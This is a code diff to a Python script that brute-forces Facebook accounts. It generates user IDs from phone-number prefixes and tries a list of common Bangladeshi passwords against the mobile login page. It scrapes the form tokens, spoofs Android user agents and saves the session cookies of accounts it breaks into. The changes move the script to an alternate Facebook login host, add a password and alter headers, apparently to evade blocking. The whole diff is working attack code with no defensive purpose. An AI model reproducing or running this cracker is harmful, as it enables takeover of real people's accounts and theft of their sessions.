@@ -152,7 +152,7 @@ def fuck():
         print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         for love in user:
             uid = code+name+cod+love
-            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','102030','203040','304050','405060','506070','607080','708090','8090100','135790','jannat','nusrat','sadia123','sadiya','fuck you','fuckyou','sumaiya','fariya','jessore','khulna','nusrat jahan','password','jannatul','barishal','shanto','mimmim','017017','0987654321','tiktok','321321','019019','016016','018018','khatun','mohammad','free fire game','pubg pubg','pubgpubg','pubg game','20232023','20222022','20212021','20202020','20192019','20182018','face book','facebook','20092009','sadia@','farjana','brishti','brishty','nabila','youtube','google','messenger','xvideo','xvideos']
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','102030','203040','304050','405060','506070','607080','708090','8090100','135790','jannat','nusrat','sadia123','sadiya','fuck you','fuckyou','sumaiya','fariya','jessore','khulna','nusrat jahan','password','jannatul','barishal','shanto','mimmim','017017','0987654321','tiktok','321321','019019','016016','018018','khatun','mohammad','free fire game','pubg pubg','pubgpubg','pubg game','20232023','20222022','20212021','20202020','20192019','20182018','face book','facebook','20092009','sadia@','farjana','brishti','brishty','nabila','youtube','google','messenger','xvideo','xvideos','valobasi']
             yaari.submit(DEVHIS2,uid,pwx,tl)
     print('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(' ┏━[•] Crack process has been completed')
@@ -170,7 +170,7 @@ def DEVHIS2(uid,pwx,tl):
             session = requests.Session()
             sys.stdout.write('\r\033[1;92m[FINDING]▶ [\033[1;37m%s/%s\033[0m\033[1;32m] [OK-%s] ~ [CP-%s]'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
-            free_fb = session.get('https://m.facebook.com').text
+            free_fb = session.get('https://mbasic.alpha.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -181,7 +181,7 @@ def DEVHIS2(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
+            header_freefb = {'authority': 'mbasic.alpha.facebook.com',
     'method': 'GET',
     'scheme': 'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -192,13 +192,14 @@ def DEVHIS2(uid,pwx,tl):
     'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"8.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 Flipboard/4.3.10/5354,4.3.10.5354',}
-            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0 SAMSUNG SM-G925F Build/EEU69693817S: wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/165.0.0.2740.102 Mobile Safari/537.36',}
+            lo = session.post('https://mbasic.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
